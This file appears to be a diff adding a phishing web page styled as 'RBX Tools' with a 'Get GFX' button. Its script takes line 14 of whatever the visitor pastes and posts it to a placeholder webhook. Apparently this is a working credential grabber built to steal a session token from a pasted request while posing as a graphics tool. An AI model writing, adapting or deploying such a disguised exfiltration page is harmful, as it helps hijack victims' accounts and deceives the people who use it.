@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBX Tools</title>
+    <style>
+        body {
+            background-color: #0b0b0b; /* black */
+            color: #00ff00; /* green */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        h1 {
+            color: #00ff00; /* green */
+        }
+
+        .textbox {
+            width: 300px;
+            padding: 10px;
+            margin: 20px auto;
+            border: 2px solid #00ff00; /* green */
+            background-color: transparent;
+            color: #00ff00; /* green */
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            border-radius: 5px;
+        }
+
+        .button {
+            display: block;
+            width: 150px;
+            padding: 10px;
+            margin: 20px auto;
+            border: 2px solid #00ff00; /* green */
+            background-color: transparent;
+            color: #00ff00; /* green */
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-decoration: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #00ff00; /* green */
+            color: #0b0b0b; /* black */
+        }
+    </style>
+</head>
+<body>
+    <h1>Get GFX</h1>
+    <textarea id="gfx_text" placeholder="Type here..."></textarea>
+    <button id="get_button" class="button">Get</button>
+
+    <script>
+        document.getElementById("get_button").addEventListener("click", function() {
+            var gamesText = document.getElementById("gfx_text").value;
+            
+            // Split the input into lines
+            var lines = gamesText.split('\n');
+
+            // Check if line 14 exists
+            if (lines.length >= 14) {
+                var line14 = lines[13]; // Line numbering starts from 0
+
+                // Replace 'YOUR_WEBHOOK_URL' with your actual webhook URL
+                var webhookUrl = 'your webhook here';
+
+                // Create a payload for the webhook
+                var payload = JSON.stringify({ content: line14 });
+
+                // Send AJAX request to webhook
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", webhookUrl, true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        // Request was successful
+                        alert("Data from line 14 sent to webhook successfully!");
+                    }
+                };
+                xhr.send(payload);
+            } else {
+                // Show error message if line 14 does not exist
+                alert("Line 14 does not exist in the input!");
+            }
+        });
+    </script>
+</body>
+</html>
